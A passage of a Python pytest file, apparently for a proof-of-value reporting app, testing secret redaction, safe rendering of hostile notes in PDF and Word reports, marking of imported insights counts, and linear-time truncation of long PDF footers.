    assert all(SECRET not in b for b in blobs) and "[redacted client_secret]" in export


def test_pov_the_report_documents_render_what_ran_in_both_formats(app):
    """ASVS V5.3.1 · CWE-116 · CWE-74: the report model with hostile notes renders a well-formed PDF and Word file showing the result."""
    pid = _profile()
    p = _start(app, pid)
    pov.update(pid, None, p["rev"], {"tests": {"url-block": {"status": "fail", "notes": HOSTILE[6] + HOSTILE[9]}}}, by="ann")
    model = pov.report_model(pov.require(pid)[1], [])
    texts, _, _ = _pdf(pov.report_pdf(model))
    text = _docx(pov.report_docx(model))
    assert "Blocked web category (Fail)" in texts and "Blocked web category (Fail)" in text and HOSTILE[6] in text


def test_pov_imported_insights_counts_are_marked_as_imported_in_the_report(app):
    """ASVS V5.1.4 · CWE-345 · WSTG-BUSL-01: Insights counts that came in a file are marked imported, and the report says so (as for verdicts)."""
    pid = _profile()
    _start(app, pid)
    data = json.loads(_export(app, pid))
    data["insights"] = [{"at": "2024-01-01T00:00:00+00:00", "by": "x", "counts": {"window": "7 days", "sections": {
        "web_action": {"title": "Web", "rows": [{"name": "Blocked", "total": 12}]}}}}]
    r = app.post("/api/pov/import", json={"profile_id": pid, "content": json.dumps(data), "replace": True})
    lines = pov._counts_lines(pov.report_model(r.json()["pov"], []))
    assert r.json()["pov"]["insights"][0]["imported"] is True and "imported" in lines[0]


def test_pov_counts_this_app_read_are_not_marked_imported(app):
    """ASVS V5.1.4 · CWE-345: negative: counts the app read itself carry no imported mark, and a page cannot add one."""
    pid = _profile()
    _start(app, pid)
    p = pov.add_insights(pid, None, {"window": "1 day", "sections": {}, "imported": True}, by="app")
    assert "imported" not in p["insights"][-1]


def test_pdf_a_very_long_footer_is_cut_once_to_fit_its_line():
    """ASVS V11.1.4 · CWE-407 · CWE-400: a 100,000-character footer is cut to its line in one pass (it was quadratic per page)."""
    doc = pdf_writer.PdfDocument(footer="x" * 100000)
    t0 = time.perf_counter()
    texts, _, _ = _pdf(doc.to_bytes())
    foot = next(t for t in texts if t.startswith("xxx"))
    assert time.perf_counter() - t0 < 1.0 and foot.endswith("…") and pdf_writer.text_width(foot, 8) <= doc.content_width
